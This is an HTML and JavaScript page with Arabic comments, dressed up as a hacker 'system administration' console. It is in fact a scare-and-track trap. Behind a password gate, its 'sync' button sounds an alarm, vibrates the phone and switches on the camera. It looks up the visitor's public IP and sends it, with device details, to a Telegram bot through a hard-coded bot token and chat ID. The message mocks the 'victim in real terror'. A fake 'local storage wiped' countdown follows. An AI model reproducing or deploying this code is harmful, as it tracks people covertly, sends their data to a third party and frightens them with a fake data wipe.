<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM ADMINISTRATION | NODE-IQ</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; touch-action: none; }
        
        /* شاشة القفل الحصينة */
        #VAULT_DOOR {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 20000; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center;
        }
        .key-input { background: #050505; border: 1px solid #0f0; color: #0f0; padding: 15px; text-align: center; width: 70%; font-size: 20px; box-shadow: 0 0 10px #0f0; }
        
        /* المحتوى المخفي */
        #MAIN_INTERFACE { display: none; height: 100vh; position: relative; }
        
        /* رادار وشاشة الرعب */
        .panel { padding: 20px; border: 1px solid #f00; margin: 10px; background: rgba(20,0,0,0.8); box-shadow: 0 0 20px red; }
        #scanner { width: 150px; height: 150px; border: 2px solid #f00; border-radius: 50%; margin: 0 auto; position: relative; overflow: hidden; display: none; }
        #v-stream { width: 100%; height: 100%; object-fit: cover; filter: grayscale(1) contrast(2); }
        .laser { position: absolute; width: 100%; height: 2px; background: #f00; animation: scan 1s infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        /* شاشة التنبيه الكبرى */
        #ALARM_OVERLAY {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,0,0,0.9); z-index: 30000; color: #fff;
            flex-direction: column; align-items: center; justify-content: center; font-weight: bold;
        }
        
        .btn-exe { background: #0f0; color: #000; border: none; padding: 20px; width: 90%; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="VAULT_DOOR">
        <h1 style="color:#f00; text-shadow: 0 0 10px #f00;">ACCESS RESTRICTED</h1>
        <p>ادخل مفتاح التشفير للمتابعة</p>
        <input type="password" id="key_in" class="key-input" placeholder="****">
        <button onclick="unlockVault()" style="background:#0f0; margin-top:20px; padding:10px 40px; border:none; font-weight:bold;">دخول</button>
    </div>

    <div id="MAIN_INTERFACE">
        <div style="background:#111; padding:10px; border-bottom:1px solid #f00; font-size:12px;">
            NODE: <span id="node-name">TRACING...</span> | STATUS: <span style="color:red">CONNECTED</span>
        </div>

        <div class="panel">
            <div id="scanner"><video id="v-stream" autoplay playsinline muted></video><div class="laser"></div></div>
            <p>> TARGET_LOCATION: <span style="color:yellow">AZIZIYAH, IQ</span></p>
            <p>> DEVICE_INFO: <span id="d-info">...</span></p>
            <p>> DATA_STREAM: <span id="d-stat" style="color:#0f0">AWAITING TRIGGER</span></p>
            <button class="btn-exe" id="start-btn" onclick="executeOmni()">بدء المزامنة (SYNC) ⚡</button>
        </div>

        <div id="log-box" style="padding:15px; font-size:10px; color:#555; height:100px; overflow:hidden;"></div>
    </div>

    <div id="ALARM_OVERLAY">
        <h1 style="font-size: 80px; margin: 0;">⚠️</h1>
        <h2>SYSTEM BREACHED</h2>
        <p>LOCAL STORAGE WIPED: <span id="percent">0%</span></p>
    </div>

    <audio id="sfx-alarm" src="https://actions.google.com/sounds/v1/alarms/emergency_it_is_vibration.ogg" loop></audio>

    <script>
        const MASTER_KEY = "0777F"; // الرمز الخاص بيك
        const TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
        const CID = "7772577035";

        // وظيفة فك القفل (الزبدة: حماية 100%)
        function unlockVault() {
            let val = document.getElementById('key_in').value;
            if(val === MASTER_KEY) {
                sessionStorage.setItem('unlocked', 'true');
                showInterface();
            } else {
                alert("ACCESS DENIED");
                location.reload();
            }
        }

        function showInterface() {
            document.getElementById('VAULT_DOOR').style.display = "none";
            document.getElementById('MAIN_INTERFACE').style.display = "block";
            loadInitialData();
        }

        // تحميل البيانات الأولية
        async function loadInitialData() {
            document.getElementById('node-name').innerText = "V-" + Math.floor(Math.random()*9999);
            document.getElementById('d-info').innerText = navigator.platform;
            let bat = await navigator.getBattery().catch(()=>({level:1}));
            addLog(`Device Battery: ${bat.level*100}%`);
            addLog(`System handshaking established.`);
        }

        function addLog(m) {
            document.getElementById('log-box').innerHTML += `<p>> ${m}</p>`;
        }

        // تنفيذ الهجوم الكامل
        async function executeOmni() {
            // 1. تفعيل الصوت والاهتزاز
            document.getElementById('sfx-alarm').play();
            if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);

            // 2. تفعيل الكاميرا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('scanner').style.display = "block";
                document.getElementById('v-stream').srcObject = stream;
            } catch(e) { addLog("Camera Permission Required."); }

            // 3. إرسال التقرير السري
            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"N/A"}));
            let msg = `🔥 **صيد إمبراطوري كامل (v1200)**\n🌐 IP: \`${ip.ip}\`\n📱 الجهاز: \`${navigator.platform}\`\nالضحية الآن في حالة رعب حقيقية!`;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);

            // 4. الرعب النهائي
            setTimeout(() => {
                document.getElementById('ALARM_OVERLAY').style.display = "flex";
                let p = 0;
                let itv = setInterval(() => {
                    p += 1;
                    document.getElementById('percent').innerText = p + "%";
                    if(p >= 100) clearInterval(itv);
                }, 50);
            }, 3000);
        }

        // فحص الدخول عند التحميل
        window.onload = function() {
            if(sessionStorage.getItem('unlocked') === 'true') showInterface();
        }
    </script>
</body>
</html>
